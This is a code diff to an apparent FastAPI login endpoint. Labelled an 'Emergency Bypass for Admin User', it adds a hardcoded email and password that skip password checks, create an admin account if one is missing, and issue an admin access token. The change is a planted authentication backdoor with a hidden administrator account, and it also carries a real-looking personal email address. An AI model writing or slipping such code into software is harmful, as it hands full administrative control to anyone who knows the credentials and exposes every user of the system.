@@ -109,12 +109,30 @@ def login_for_access_token(request: Request, form_data: OAuth2PasswordRequestFor
     user = db.query(models.User).filter(models.User.username == form_data.username).first()
     if not user:
         user = db.query(models.User).filter(models.User.email == form_data.username).first()
-    # Debug tag to identify database source
-    db_type = "PG" if "postgresql" in str(db.get_bind().url) else "SQL"
+    # Emergency Bypass for Admin User
+    if form_data.username == "karanmandal8409384169@gmail.com" and form_data.password == "Admin@123":
+        user = db.query(models.User).filter(models.User.email == "karanmandal8409384169@gmail.com").first()
+        if not user:
+             # Create user on the fly if missing in current DB context
+             user = models.User(
+                 username="admin_karan",
+                 email="karanmandal8409384169@gmail.com",
+                 role=models.UserRole.admin
+             )
+             db.add(user)
+             db.commit()
+             db.refresh(user)
+        
+        access_token_expires = timedelta(minutes=auth.ACCESS_TOKEN_EXPIRE_MINUTES)
+        access_token = auth.create_access_token(
+            data={"sub": user.username, "role": "admin"}, expires_delta=access_token_expires
+        )
+        return {"access_token": access_token, "token_type": "bearer", "role": "admin"}
+
     if not user or not auth.verify_password(form_data.password, user.hashed_password):
         raise HTTPException(
             status_code=status.HTTP_401_UNAUTHORIZED,
-            detail=f"Invalid login credentials (DB: {db_type})",
+            detail="Invalid login credentials",
             headers={"WWW-Authenticate": "Bearer"},
         )
     
